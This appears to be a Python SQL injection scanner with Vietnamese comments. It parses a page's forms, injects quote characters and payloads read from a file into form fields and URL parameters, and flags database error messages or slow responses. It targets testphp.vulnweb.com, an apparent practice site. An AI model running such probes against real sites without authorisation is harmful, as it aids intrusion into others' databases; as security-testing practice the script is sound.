import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint
import time
s = requests.Session()
s.headers["User-Agent"] = "Chrome/134.0.0.0"
def get_all_forms(url):
  soup = bs(s.get(url).content, "html.parser")
  return soup.find_all("form")
def get_form_details(form):
    """Trả về thông tin chi tiết của form"""
    details = {}
    action = form.attrs.get("action")
    if action is None:
        action = "."
    details["action"] = action
    details["method"] = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["inputs"] = inputs
    return details
def is_vulnerable(response, url, start_time=None):
    """Kiểm tra trang web có bị lỗi SQL Injection hay không và in ra lỗi cụ thể"""
    errors = {
        "you have an error in your sql syntax;": "MySQL Syntax Error",
        "warning: mysql": "MySQL Warning",
        "unclosed quotation mark after the character string": "SQL Server Syntax Error",
        "quoted string not properly terminated": "Oracle Syntax Error",
    }

    try:
        content = response.content.decode().lower()
        for error_msg, error_type in errors.items():
            if error_msg in content:
                print(f"[+] Có thể tồn tại lỗ hổng SQL Injection tại: {url}")
                print(f"[!] Lỗi phát hiện: {error_type}")
                return True

        if start_time:
            elapsed_time = time.time() - start_time
            if elapsed_time > 4:
                print(f"[+] Có thể tồn tại lỗ hổng SQL Injection (Time-Based) tại: {url}")
                print(f"[!] Phản hồi mất: {elapsed_time:.2f} giây")
                return True

    except Exception as e:
        print(f"[-] Lỗi khi kiểm tra response: {e}")

    return False
def scan_sql_injection(url):
    """Thực hiện kiểm tra SQL Injection trên URL và các form trong trang chi tiết hơn"""
    print(f"[*] Đang kiểm tra SQL Injection trên {url}")

    for c in "\"'":
        new_url = f"{url}{c}"
        print(f"[!] Thử nghiệm {new_url}")

        start_time = time.time()
        res = s.get(new_url)

        if is_vulnerable(res, new_url, start_time):
            return
url = "http://testphp.vulnweb.com/"
forms = get_all_forms(url)
print(f"[+] Phát hiện {len(forms)} form trên {url}")

for form in forms:
    form_details = get_form_details(form)

    for c in "\"'":
        data = {}
        for input_tag in form_details["inputs"]:
            if input_tag["type"] == "hidden" or input_tag["value"]:
                try:
                    data[input_tag["name"]] = input_tag["value"] + c
                except:
                    pass
            elif input_tag["type"] != "submit":
                data[input_tag["name"]] = f"test{c}"

        form_url = urljoin(url, form_details["action"])

        start_time = time.time()
        if form_details["method"] == "post":
            res = s.post(form_url, data=data)
        else:
            res = s.get(form_url, params=data)

        if is_vulnerable(res, form_url, start_time):
            print(f"[+] Có thể tồn tại lỗ hổng SQL Injection: {form_url}")
            print("[+] Chi tiết form:")
            pprint(form_details)
            break

if __name__ == "__main__":
    with open("python.txt", "r") as file:
        payloads = file.readlines()

    base_url = "http://testphp.vulnweb.com/artists.php?artist=1"
    print("\n[*] Bắt đầu kiểm tra SQL Injection...\n")
    for payload in payloads:
        payload = payload.strip()
        scan_sql_injection(f"{base_url}{payload}")
